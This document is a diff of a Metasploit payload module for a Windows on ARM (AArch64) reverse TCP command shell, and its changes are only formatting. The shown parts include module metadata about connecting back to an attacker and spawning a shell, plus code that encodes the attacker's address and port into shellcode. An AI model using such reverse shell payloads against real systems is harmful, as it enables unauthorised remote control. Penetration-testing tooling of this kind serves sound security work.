@@ -24,7 +24,7 @@ module MetasploitModule
     super(
       merge_info(
         info,
-        'Name'        => 'Windows AArch64 Command Shell, Reverse TCP Inline',
+        'Name' => 'Windows AArch64 Command Shell, Reverse TCP Inline',
         'Description' => %q{
           Connect back to the attacker and spawn a Windows command shell on a
           Windows on ARM (AArch64) target. Position-independent shellcode that
@@ -34,17 +34,17 @@ module MetasploitModule
           the socket via CreateProcessA + STARTF_USESTDHANDLES. EXITFUNC is
           honored via a runtime hash-dispatcher.
         },
-        'Author'      => [
+        'Author' => [
           'vinicius-batistella' # AArch64 reverse_tcp port from the x64 stager logic
         ],
-        'License'     => MSF_LICENSE,
-        'Platform'    => 'win',
-        'Arch'        => ARCH_AARCH64,
-        'Handler'     => Msf::Handler::ReverseTcp,
-        'Session'     => Msf::Sessions::CommandShell,
-        'Payload'     => { 'Offsets' => {}, 'Payload' => '' },
-        'Notes'       => {
-          'Stability'   => [CRASH_SAFE],
+        'License' => MSF_LICENSE,
+        'Platform' => 'win',
+        'Arch' => ARCH_AARCH64,
+        'Handler' => Msf::Handler::ReverseTcp,
+        'Session' => Msf::Sessions::CommandShell,
+        'Payload' => { 'Offsets' => {}, 'Payload' => '' },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
           'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
         }
       )
@@ -74,7 +74,7 @@ module MetasploitModule
     # Map LHOST/LPORT onto the MOVK immediates inside fill_sockaddr_fast.
     # sin_port:  network-order bytes loaded as a little-endian 16-bit imm.
     # sin_addr:  octets 0..1 -> low halfword, octets 2..3 -> high halfword.
-    port_imm  = [lport].pack('n').unpack1('v')
+    port_imm = [lport].pack('n').unpack1('v')
     ip_lo_imm = ip_bytes[0, 2].unpack1('v')
     ip_hi_imm = ip_bytes[2, 2].unpack1('v')
 
@@ -83,11 +83,11 @@ module MetasploitModule
     exit_hash = exitfunk_hash(datastore['EXITFUNC'])
 
     asm = build_asm(
-      port_imm:  port_imm,
+      port_imm: port_imm,
       ip_lo_imm: ip_lo_imm,
       ip_hi_imm: ip_hi_imm,
-      exit_lo:   exit_hash & 0xFFFF,
-      exit_hi:   (exit_hash >> 16) & 0xFFFF
+      exit_lo: exit_hash & 0xFFFF,
+      exit_hi: (exit_hash >> 16) & 0xFFFF
     )
 
     compile_aarch64(asm)
@@ -127,7 +127,6 @@ module MetasploitModule
     end
   end
 
-  # rubocop:disable Metrics/MethodLength
   def build_asm(port_imm:, ip_lo_imm:, ip_hi_imm:, exit_lo:, exit_hi:)
     # Differences from the standalone rev2.s prototype:
     #   - `.text` / `.global` directives stripped (aarch64 gem rejects them)
@@ -369,12 +368,11 @@ module MetasploitModule
         brk     #0
     ASM
   end
-  # rubocop:enable Metrics/MethodLength
 
   def compile_aarch64(asm_string)
     require 'aarch64/parser'
     parser = ::AArch64::Parser.new
-    asm    = parser.parse(without_inline_comments(asm_string))
+    asm = parser.parse(without_inline_comments(asm_string))
     asm.to_binary
   end
 
